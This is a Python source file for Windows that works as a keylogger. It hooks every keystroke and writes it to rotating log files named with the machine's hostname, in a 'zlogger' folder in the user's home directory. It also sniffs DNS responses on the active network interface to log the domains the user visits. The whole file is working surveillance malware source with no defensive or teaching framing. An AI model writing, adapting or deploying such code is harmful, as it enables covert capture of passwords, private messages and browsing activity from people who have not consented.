import socket

import os

import win32event
import win32api
import winerror

import datetime
import logging
import logging.handlers
import keyboard

import netifaces
import winreg

import scapy.all as scapy



# get the user name as identifier
user_name = str(socket.gethostname())

#Getting current active network interface#

# Define a function to get the name of an interface from its GUID
def get_interface_name(guid):
    # Open the registry key that contains the mapping
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    # Try to get the subkey that corresponds to the GUID
    try:
        subkey = winreg.OpenKey(key, guid + r'\Connection')
        # Try to get the value that contains the name
        try:
            name = winreg.QueryValueEx(subkey, 'Name')[0]
            # Return the name
            return name
        except FileNotFoundError:
            # If the value is not found, return None
            return None
    except FileNotFoundError:
        # If the subkey is not found, return None
        return None

active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])

#For creating app dir
home_path = os.path.expanduser("~")
dir_name = "zlogger"
dir_path = os.path.join(home_path, dir_name)
if not os.path.exists(dir_path):
    os.makedirs(dir_path)
os. chdir(dir_path)


#disallowing multiple instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print ("Multiple Instance not Allowed")
    exit(0)
x=''
data=''
count=0

# get the current date and time as a string
current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
##############################################################################

##for word count interval##

# define a custom handler class that inherits from FileHandler
class WordCountHandler(logging.FileHandler):
    # initialize the handler with the file name and the word limit
    def __init__(self, filename, mode='a', encoding=None, delay=False, word_limit=50):
        # call the parent constructor
        super().__init__(filename, mode, encoding, delay)
        # set the word limit attribute
        self.word_limit = word_limit
    # override the emit method
    def emit(self, record):
        # get the current log file content
        with open(self.baseFilename, 'r') as f:
            content = f.read()
        # split the content by whitespace and get the word count
        word_count = len(content.split())
        # check if the word count exceeds the limit or if this is the first log file
        if word_count >= self.word_limit:
            # close the current file
            self.close()
            # get the current date and time as a string
            current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
            # create a new file with a different name based on the date and time without the prefix
            self.baseFilename = f"log-"+user_name+current_time+".txt"
            # open the new file in append mode
            self.stream = self._open()
        # call the parent emit method to write the record to the file
        super().emit(record)

# create a logger object
keylogger = logging.getLogger('my_app')
# set the logging level to INFO
keylogger.setLevel(logging.INFO)
# get the current date and time as a string
current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
# create a WordCountHandler object with a word limit of 50 and a filename of 'keylog.txt'
logHandler = WordCountHandler('keylog-'+user_name+current_time+".txt", word_limit=50)

##for word count interval##

############################################################################################

##for time interval##

# # create a logger object
# logger = logging.getLogger('my_app')
# # set the logging level to INFO
# logger.setLevel(logging.INFO)
# # create a TimedRotatingFileHandler object
# logHandler = logging.handlers.TimedRotatingFileHandler('log', when='S', interval=30, backupCount=5)
# # set the suffix for the rotated file name
# logHandler.suffix = user_name+'-%Y-%m-%d-%H-%M-%S.txt'

##for time interval##

############################################################################################


# set the logging level to INFO
logHandler.setLevel(logging.INFO)
# create a formatter object
formatter = logging.Formatter('%(message)s')
# set the formatter for the handler
logHandler.setFormatter(formatter)
# add the handler to the logger
keylogger.addHandler(logHandler)



# define a callback function to process the keystrokes
def on_key_press(event):
    # get the name of the pressed key
    key = event.name
    # write the keystroke to the log file
    keylogger.info(key)

# hook the keyboard events with the callback function
keyboard.on_press(on_key_press)

# wait for keyboard events in a loop
# keyboard.wait()



#dns a quary

# get the current date and time as a string
current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
# Set up the logging configuration
logging.basicConfig(filename='dnslog-'+user_name+current_time+'.txt', filemode='a', format='%(asctime)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.INFO)

# Define a function to process each packet
def process_packet(packet):
    # Check if the packet has a DNS layer and a DNS response
    if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
        # Check if the packet has any answers in the DNS response
        if packet[scapy.DNS].an is not None:
            # Loop through each answer in the DNS response
            for answer in packet[scapy.DNS].an:
                # Check if the answer is an A record
                if answer.type == 1:
                    # Get the domain name and the IP address from the answer
                    domain = answer.rrname.decode('utf-8')
                    ip = answer.rdata
                    # Log the domain name and the IP address
                    logging.info(f'A record: {domain} -> {ip}')

# Sniff packets on the network interface and pass them to the process_packet function
scapy.sniff(iface=active_interface, store=False, prn=process_packet)